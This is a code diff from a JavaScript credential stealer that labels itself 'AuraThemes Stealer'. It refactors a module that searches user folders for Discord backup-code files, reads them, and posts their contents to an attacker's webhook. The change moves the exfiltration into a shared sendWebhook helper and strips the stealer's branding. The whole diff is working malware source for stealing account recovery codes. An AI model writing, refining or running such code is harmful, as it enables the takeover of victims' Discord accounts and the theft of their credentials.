@@ -1,8 +1,13 @@
-const { getUsers } = require('../../utils/harware.js');
-const FormData     = require('form-data');
-const axios        = require('axios');
-const path         = require('path');
-const fs           = require('fs');
+const {
+    sendWebhook 
+} = require('../../utils/request/sendWebhook.js');
+
+const { 
+    getUsers 
+} = require('../../utils/harware.js');
+
+const path = require('path');
+const fs   = require('fs');
 
 module.exports = async (webhook) => {
     const users = await getUsers();
@@ -49,40 +54,25 @@ function searchFiles(dir, webhook) {
 
                         if (stats.isFile()) {
                             if (stats.size <= 2 * 1024 * 1024 && file.startsWith('discord_backup_codes')) {
-                                fs.readFile(filePath, 'utf8', async (err, data) => {
+                                fs.readFile(filePath, 'utf8', async (err, codes) => {
                                     if (err) {
                                         console.error('Error reading file:', err);
                                         resolve(false);
                                         return;
                                     }
-                                    if (data.length > 0) {
-                                        const payload = {
-                                            avatar_url: 'https://i.imgur.com/WkKXZSl.gif',
-                                            username: 'AuraThemes Stealer - Codes',
+                                    if (codes.length > 0) {
+                                        const data = {
                                             content: `\`${filePath}\``,
                                             embeds: [
                                                 {
                                                     title: 'Discord Backup Codes',
-                                                    color: "12740607",
-                                                    description: `\`\`\`yml\n${data.length === 0 ? 'Not found' : data}\n\`\`\``,
-                                                    timestamp: new Date(),
-                                                    footer: {
-                                                        text: 'AuraThemes Stealer',
-                                                        icon_url: 'https://i.imgur.com/yVnOSeS.gif'
-                                                    }
+                                                    description: `\`\`\`yml\n${codes.length === 0 ? 'Not found' : codes}\n\`\`\``,
                                                 }
                                             ]
                                         };
 
                                         try {
-                                            const form = new FormData();
-                                            form.append('payload_json', JSON.stringify(payload));
-
-                                            await axios.post(webhook, form, {
-                                                headers: {
-                                                    ...form.getHeaders()
-                                                }
-                                            });
+                                            await sendWebhook(webhook, data);
                                             resolve(true);
                                         } catch (error) {
                                             console.error("Could not send codes with webhook:", error);
